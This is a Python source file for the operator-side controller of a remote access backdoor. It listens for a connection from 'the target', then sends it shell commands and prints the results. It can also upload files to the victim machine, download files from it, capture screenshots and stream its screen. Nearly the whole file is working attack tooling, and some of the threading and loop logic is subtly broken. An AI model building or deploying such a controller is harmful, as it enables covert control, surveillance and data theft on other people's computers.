# WARNING: If the server does not start and retrieves the OSError 98 
# of "Address already in use", use the "ps -fA | grep python" command
# to check the PID of the service and kill it with the "kill -9 (PID)"
# command; (replace (PID) by the actual PID)

import socket
import termcolor
import json
import help
import os
from vidstream import StreamingServer
import threading

# Connection data
HOST = '127.0.0.1'
PORT = 5555
STREAM_PORT = 9999
streamFlag = 0

def send(data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

# In order not to overflow the default socket.recv() function
# the function recv() reads the data in chunks of 1024 bytes
# at a time and appends it to the data variable.
def recv():
    data = ''

    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Upload file to the target's file system
def uploadFile(fileName):
    f = open(fileName, 'rb') # Open the file on 'read bytes' mode
    target.send(f.read())

#  Downloads the specified file from the targets file system
def  downloadFile(fileName): 
    f = open(fileName, 'wb') # Open the file in reading bytes mode
    target.settimeout(1)
    chunk = target.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = target.recv(1024)

        except socket.timeout as e:
            break

    target.settimeout(None)
    f.close()

# Receive the screenshot from the target
def screenshotRecv(count): 
    f = open('screenshot%d.png' % (count), 'wb')
    target.settimeout(3)
    chunk = target.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = target.recv(1024)

        except socket.timeout as e:
            break

    target.settimeout(None)
    f.close()

# Start screensharing
def streamServerStart():
    server = StreamingServer(HOST, STREAM_PORT)

    t = threading.Thread(target=server.start_server())
    t.start()

    cmd = input("[-] Type 'stream-stop' to end the stream:")

    while cmd != 'stream-stop':
        continue

    send(cmd)
    server.stop_server()

# Sends and receives data to and from the backdoor
def targetComs():
    count = 0
    
    global streamFlag

    while True:

        prompt = input("Shell [%s]:" % str(ip))
        send(prompt)

        if prompt == 'exit': # Exit the loop if the exit message is sent
            break

        elif prompt == 'clear': # Clear the screen
            os.system('clear')
        
        elif prompt.startswith('cd '): # (Change directory implementation on the client-side)
            pass

        elif prompt.startswith('upload'): # Upload a file to  the target's file system
            uploadFile(prompt[7:])

        elif prompt.startswith('download'): # Download a file from the target's file system
            downloadFile(prompt[9:])

        elif prompt.startswith('screenshot'):
            screenshotRecv(count)
            count += 1

        elif prompt.startswith('stream-start'):
            streamServerStart()

        elif prompt == 'help': # List all the available commands to the user
            print(termcolor.colored(help.HELP, 'green'))

        else:
            response = recv()
            print(response)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))

print(termcolor.colored(f'[+] Server listening on port [{PORT}] for incoming connections', 'green'))

sock.listen(5)

target, ip = sock.accept()
print(termcolor.colored(f'[+] Connection astablished with [{str(ip[0])}] port [{str(ip[1])}]!', 'green'))

targetComs()
